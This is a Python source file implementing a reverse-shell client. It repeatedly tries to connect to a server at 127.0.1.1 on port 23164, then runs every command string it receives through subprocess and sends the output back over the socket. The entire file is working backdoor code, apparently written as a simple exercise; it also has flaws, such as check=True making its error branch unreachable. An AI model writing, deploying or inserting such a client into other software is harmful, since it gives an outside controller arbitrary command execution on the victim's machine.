import socket
import time
import subprocess


class Client:

    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connection(self):
        """
            Tries to connect to the Server each N seconds then calls the shell function
        """
        # Define the number of seconds to wait
        time.sleep(2)
        print('[+] Trying to connect...')
        #  Infinite loop so the program tries to connect every N seconds
        while True:
            try:
                # tries to connect to the server
                self.sock.connect(('127.0.1.1', 23164))
                print("[+] Connection established")
                self.shell()
                # it breaks the loop if I can connect since no error has been thrown
                break
            except ConnectionRefusedError as e:
                print(f'[{e.errno}] Couldn\'t connect to host.')
                self.connection()
            except PermissionError as e:
                print(f'[{e.errno}] Connection with host interrupted by the host.')
                self.sock.close()
                self.create_socket()
            except OSError as e:
                print(f'[{e.errno}] Already connected to host.')
                self.sock.close()
                self.create_socket()
        print('Closed.')

    def shell(self):
        """
            Listen to the commands made by the Server.
        """
        while True:
            data = self.sock.recv(1024)
            data = data.decode('utf-8')
            if data == 'terminate':
                break
            shell_result = subprocess.run(
                data.split(' '),
                capture_output=True,
                check=True
            )
            if shell_result.returncode == 0:
                print('no error')
                self.sock.sendall(shell_result.stdout)
            else:
                print('error caught')

                self.sock.sendall(shell_result.stderr)

    def create_socket(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection()


if __name__ == '__main__':
    Client().connection()
